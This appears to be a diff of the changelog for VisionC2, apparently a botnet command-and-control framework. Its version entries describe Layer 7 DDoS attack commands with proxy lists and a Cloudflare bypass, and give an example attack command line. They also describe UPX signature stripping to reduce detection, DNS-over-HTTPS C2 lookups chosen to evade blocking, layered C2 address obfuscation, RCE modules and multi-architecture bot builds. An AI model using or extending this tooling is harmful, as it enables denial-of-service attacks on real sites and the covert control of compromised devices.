@@ -1,7 +1,24 @@
 
+
 ## 📋 Changelog
 
-All notable changes to **VisionC2** are documented in this file.
+All notable changes to **VisionC2** are documented below.
+
+---
+
+### v1.6 — February 2026
+
+#### 🎨 UI / UX
+
+* **Login Screen Redesign**
+
+  * Animated spinner, eye-themed UI, progress-based auth feedback
+  * Success/failure banners and 3-attempt lockout screen
+* **Command Menu Rework**
+
+  * Split attack commands into `attack` / `methods`
+  * Slimmed `help` menu with shortcut links
+  * `?` now shows help + attack hints
 
 ---
 
@@ -11,53 +28,41 @@ All notable changes to **VisionC2** are documented in this file.
 
 * **Automatic UPX Signature Stripping**
 
-  * Binary protection now runs automatically at the end of setup
-  * Added `deUPX.py` for automated UPX pattern removal
-  * Integrated into `build.sh` for seamless post-build obfuscation
-  * Reduces static string analysis and signature-based detection
+  * `deUPX.py` added and integrated into `build.sh`
+  * Runs automatically post-setup to reduce static detection
 
 #### 📚 Documentation
 
-* **Comprehensive Code Comments**
+* **Full Code Documentation**
 
-  * Full developer documentation across CNC and Bot code
-  * All CNC functions include detailed descriptions
-  * All Bot functions documented with parameter explanations
+  * CNC and Bot functions fully commented
 * **Command Reference**
 
   * Moved to `cnc/COMMANDS.md`
-  * Includes command usage, examples, and permission requirements
 * **Setup Summary**
 
-  * Setup wizard now prints a full configuration summary on completion
+  * Configuration summary printed after setup
 
 #### 🤖 Bot Enhancements
 
-* **+50 Additional User-Agents**
+* **+50 User-Agents**
 
-  * Expanded Layer 7 fingerprint diversity
-  * Improves HTTP-based attack effectiveness
+  * Expanded Layer 7 fingerprints
 * **DoH-First C2 Resolution**
 
-  * DNS-over-HTTPS now prioritized over plain DNS for C2 lookups
-  * Encrypted queries harder to detect and block
-  * Fallback order: DoH TXT → DNS TXT → A Record → Direct IP
+  * Resolution order: DoH TXT → DNS TXT → A → Direct IP
 
 ---
 
 ### v1.4 — January 2026
 
-#### 🚀 New Features
+#### 🚀 Features
 
-* **Proxy List Support for Layer 7 Attacks**
+* **Proxy List Support (Layer 7)**
 
-  * Supported commands: `!http`, `!https`, `!tls`, `!cfbypass`
-  * Supports multiple proxy formats:
-
-    * `ip:port`
-    * `ip:port:user:pass`
-    * `http://`, `socks5://`
-  * Example usage:
+  * Commands: `!http`, `!https`, `!tls`, `!cfbypass`
+  * Formats: `ip:port`, `ip:port:user:pass`, `http://`, `socks5://`
+  * Example:
 
     ```
     !http target.com 443 60 -p https://example.com/proxies.txt
@@ -67,46 +72,34 @@ All notable changes to **VisionC2** are documented in this file.
 
 ### v1.3 — January 2026
 
-#### 🚀 New Features
+#### 🚀 Features
 
 * **RAM Tracking**
 
-  * Bots now report total system RAM during registration
-  * Displayed in bot listings (e.g., `RAM: 4.0GB`)
-* **Comprehensive Debug Logging**
+  * Bots report total RAM on registration
+* **Debug Logging**
 
-  * TCP dial and connection attempts
-  * TLS handshake and cipher suite details
-  * Authentication challenge/response flow
-  * Bot registration data
-  * Command execution tracking
-  * PING/PONG handling
+  * Connection, TLS, auth, registration, command flow
 * **CF / TLS Bypass Improvements**
 
-  * Stability and reliability improvements for bypass-related commands
+  * Stability and reliability updates
 
 ---
 
 ### v1.2 — January 2026
 
-#### 🔒 Security Enhancements
+#### 🔒 Security
 
 * **C2 Address Obfuscation**
 
-  * Encryption method changed from RC5 to RC4 for compatibility
-  * 4-layer obfuscation:
+  * RC5 → RC4
+  * XOR → RC4 → MD5 → Base64
 
-    * XOR → RC4 → MD5 → Base64
-  * Prevents static extraction of C2 addresses
-
-#### 🛠️ Tooling & Modules
+#### 🛠️ Tooling
 
 * **Automated `setup.py`**
-
-  * Simplified initial configuration and rebuilds
 * **RCE & Proxy Modules**
-
-* **Early support for CF/TLS bypass methods**
+* **Early CF/TLS bypass support**
 
 ---
 
@@ -115,28 +108,23 @@ All notable changes to **VisionC2** are documented in this file.
 #### 🎉 Initial Release
 
 * **TLS 1.3 Encrypted Communications**
-
-  * Perfect Forward Secrecy enabled
-  * Modern cipher suites enforced
 * **14-Architecture Cross-Compilation**
 
-  * Linux: amd64, 386, arm, arm64, mips, mipsle, mips64, mips64le
-  * Additional embedded targets
+  * amd64, 386, arm, arm64, mips, mipsle, mips64, mips64le
 * **HMAC Challenge-Response Authentication**
-
-  * Prevents unauthorized bot impersonation
-  * Magic code validation
 
 ---
 
 ## Version History Summary
 
-| Version | Date     | Highlights                                                   |
-| ------- | -------- | ------------------------------------------------------------ |
-| v1.5    | Feb 2026 | Auto UPX stripping, comprehensive code docs, +50 user agents |
-| v1.4    | Jan 2026 | Proxy list support for Layer 7 attacks                       |
-| v1.3    | Jan 2026 | RAM tracking, debug logging, UI updates, CF/TLS bypass       |
-| v1.2    | Jan 2026 | RC4 obfuscation, automated setup, RCE & proxy modules        |
-| v1.1    | Dec 2025 | Initial release — TLS 1.3, 14 architectures                  |
+| Version | Date     | Highlights                           |
+| ------- | -------- | ------------------------------------ |
+| v1.6    | Feb 2026 | UI overhaul, command menu rework     |
+| v1.5    | Feb 2026 | UPX stripping, docs, +50 user agents |
+| v1.4    | Jan 2026 | Proxy support for Layer 7            |
+| v1.3    | Jan 2026 | RAM tracking, debug logging          |
+| v1.2    | Jan 2026 | RC4 obfuscation, setup automation    |
+| v1.1    | Dec 2025 | Initial release                      |
 
 ---
+
